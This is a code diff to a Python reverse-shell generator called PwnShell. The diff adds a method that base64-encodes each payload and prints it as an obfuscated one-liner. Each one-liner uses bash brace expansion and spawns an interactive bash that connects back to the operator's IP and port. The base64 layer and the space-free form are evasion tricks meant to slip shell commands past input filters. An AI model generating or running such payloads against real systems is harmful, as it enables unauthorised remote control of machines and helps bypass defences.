@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # coding=utf-8
+import base64
 import netifaces
 import os
 import argparse
@@ -29,6 +30,7 @@ class PwnShell:
         self.authentication = args.auth
         self.type = args.type
         self.file = args.file
+
         ########################################################################
         ###################### Specifying OS ###################################
         if self.type == "linux" or self.type == "l":
@@ -53,9 +55,10 @@ class PwnShell:
 
     def shell_linux(self):  # Default option
         self.info()
+        self.base64_payloads()
         # self.login()
-        self.is_valid()
-        self.thread()  # leave it the last one
+       # self.is_valid()
+        #self.thread()  # leave it the last one
 
     #########################################################################################
     ###################################  WINDOWS #########################################
@@ -226,6 +229,13 @@ class PwnShell:
                 print("the port is in use")
                 break
 
+    def base64_payloads(self):
+        payloads = PayLoads(self.ip, self.port).payloads()
+        for payload in payloads:
+            cli = payload.encode("utf-8")
+            encoded = base64.b64encode(cli).decode('utf-8')
+            base_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
+            print(base_payload)
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
 
@@ -257,6 +267,7 @@ if __name__ == '__main__':
             ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
             parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
         except:
+            ip_address = None
             parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS',required=True)
         parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
         parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
